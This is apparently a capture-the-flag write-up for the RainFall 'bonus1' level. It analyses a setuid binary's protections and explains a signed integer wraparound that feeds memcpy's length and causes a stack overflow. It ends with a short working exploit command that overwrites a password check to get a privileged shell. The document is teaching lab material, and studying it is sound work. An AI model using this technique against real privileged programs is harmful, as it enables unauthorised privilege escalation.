# RainFall (bonus1)

In this project, we try to **exploit binaries** with the intent of reading the `/home/users/level<n+1>/.pass` file, containing our flag serving as the password for the next level.

# Binary

Binary properties:
- Full path: `/home/user/bonus1/bonus1`
- Type: **ELF 32-bit LSB executable** (`file -b ~/bonus1`)

To analyze its content we generated two files:
- [source.c](./source.c): generated with our [ghidra.sh](../common/ghidra/ghidra.sh), wrapping a [Ghidra](https://github.com/nationalsecurityagency/ghidra)-based [docker container](https://hub.docker.com/r/blacktop/ghidra).
- [source.asm](./source.asm): trimmed after being generated through `objdump -D ~/bonus1`.

# Security

Let's connect to the server through [ssh](./Ressources/ssh.sh) and inspect the protections in place.

## File Attributes

```sh
$ ls -la ~/bonus1
-rwsr-s---+ 1 bonus2 users 5043 Mar  6  2016 /home/user/bonus1/bonus1
```

These describe the binary's privileges.
|    Attribute    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|    Suid bit     |    ✅     | Runs with bonus2's effective id: opening a shell inherits it.


## Compile-Time

```sh
$ checksec --file ~/bonus1
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus1/bonus1
```

These are the protections baked directly into the binary.
|   Protection    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|      RELRO      |    ❌     | GOT is writable.
|  Stack Canary   |    ❌     | Stack buffer overflows are possible.
|       NX        |    ❌     | Stack/Heap are nonexecutable. Shellcode injection is possible.
|       PIE       |    ❌     | The stack's position is predictable.
| RPATH / RUNPATH |    ❌     | No custom library search path to hijack.

## Kernel Run-Time

```sh
$ cat /proc/sys/kernel/randomize_va_space
0
```

These are the protections baked directly into the binary.
|   Protection    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|      ASLR       |    ❌     | Stack and heap addresses are stable across runs.

## Documentation

Reference material for the concepts above:
- Setuid flag (Suid): https://fr.wikipedia.org/wiki/Setuid
- Relocation Read-Only (RELRO): https://ctf101.org/binary-exploitation/relocation-read-only/
- Stack canary: https://ctf101.org/binary-exploitation/stack-canaries/
- No eXecute (NX): https://ctf101.org/binary-exploitation/no-execute/
- Position Independent Code (PIE): https://en.wikipedia.org/wiki/Position-independent_code
- RUNPATH & RPATH: https://en.wikipedia.org/wiki/Rpath
- Address Space Layout Randomization (ASLR): https://ctf101.org/binary-exploitation/address-space-layout-randomization/

## Discovered vulnerability

The decompiled binary (cf. [source](source.c)) is subject to an "Integer Overflow or Wraparound" ([CWE-190](https://cwe.mitre.org/data/definitions/190.html)) that enables a "Stack-based Buffer Overflow" ([CWE-121](https://cwe.mitre.org/data/definitions/121.html)).

A privilege escalation opportunity is hidden behind 2 conditions that, together, are intended to be impossible to pass.
The aforementioned **password** (`argv[1]`) is passed as a **signed 32-bit integer** and must be `< 10` but also `== 1464814662` (`0x574f4c46`).

The thing is that an unnecessary `memcpy()` call is inserted between the first and the second condition.

`memcpy()`:
- writes a user controlled buffer (`argv[2]`) directly into a fixed 40-byte stack buffer.
- derives its length from **password** as `password * 4`. The `< 10` gate is a **signed** check (any negative value passes), but the length is computed on a **32-bit** integer that **wraps around** and is consumed as an unsigned **size_t**. A negative **password** thus clears the gate yet yields a positive length large enough (`>= 44`) to overflow the buffer and overwrite **password** itself.

## Vulnerability analysis

Analysing the [source](source.c) we assumed the following: **buffer** and **password** are defined contiguously in the stack.  
If this is true, the value of **password** could be arbitrarily set via `memcpy()`. 

### Stack

`main()` is the only function and the one that holds the overflowed buffer.
Its stack frame should resemble something like this:
```ruby
      HIGHER MEMORY ADDRESSES     
| |      argv     | (4 bytes)    | <-- ['./bonus1', arg1, arg2];
| +---------------+              |
| |      argc     | (4 bytes)    |
+--------------------------------+
|      main's return address     | (4 bytes)
+--------------------------------+ <--- main's Stack Frame start (@ 0xbffffe5c)
|   caller's stack base pointer  | (4 bytes)
+--------------------------------+ <--- main's local variables start (EBP: @ 0xbffffe58)
| |  unused/align | (8 bytes)    |
| +---------------+ (0xbffffe50) |
| |    password   | (4 bytes)    |
| +---------------+ (0xbffffe4c) |
| |               |              |
| |     buffer    | (40 bytes)   |
| |               |              | (64 bytes)
| +---------------+ (0xbffffe24) |
| |  unused/align | (8 bytes)    |
| +---------------+ (0xbffffe1c) |
| |    arg nº3    | (4 bytes)    |
| +---------------+ (0xbffffe18) |
| |    arg nº2    | (4 bytes)    |
| +---------------+ (0xbffffe14) |
| |    arg nº1    | (4 bytes)    |
+--------------------------------+ <--- main's Stack Pointer (ESP: @ 0xbffffe10)
      LOWER MEMORY ADDRESSES      
```

### Intent

As observed: **buffer** and **password** are contiguous in memory. Overflowing **buffer** by 4 bytes would allow us to overwrite **password**.

To achieve this, **password** must satisfy two conditions:
- it must be `< 10` (to pass the first check).
- must wrap-around to target length when multiplied by 4 (cf. [Formula](#formula)).

As well, the intended password value provided to us is:
- In **big-endian hex**: `0x574f4c46`  
- In **big-endian hex** escape sequence: `\x57\x4f\x4c\x46`.  
- In **little-endian hex** escape sequence: `\x46\x4c\x4f\x57`.  
- In **little-endian oct** escape sequence: `\106\114\117\127`.  

## Formula

We want `memcpy()` to copy exactly **44 bytes**: the **40 bytes** of **buffer** + the **4 bytes** of **password** sitting right above it.  
Our only lever is **password** itself, since the copied length is `password * 4`.

Two facts constrain the value of **password**:
- it is a **signed 32-bit** `int`, so `password * 4` **wraps around** `2^32` before being read as an unsigned `size_t`.
- it must stay `< 10` to pass the first condition.

The first approach was naive: `password = memcpy_length / 4`.
Though, when `memcpy_length` is set to 44, it yielded `11`, which was too high.

To get a negative value, the second approach was premeditating the wrap-around caused by the type conflict. As we are on a **32-bit binary**, we can just substract 2^32 bytes to trigger an inverse wrap around artifically: `(memcpy_length - 2^32) / 4`.

For `memcpy_length = 44`, this gives `password = -1073741813`.

## Exploit

```sh
$ arg1='-1073741813'; # (44 - 2^32) / 4:
$ arg2='XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\106\114\117\127';
$ ./bonus1 "$arg1" "$(printf '%b' "$arg2")"
```

From there, we can open the  `/home/user/bonus2/.pass` file.
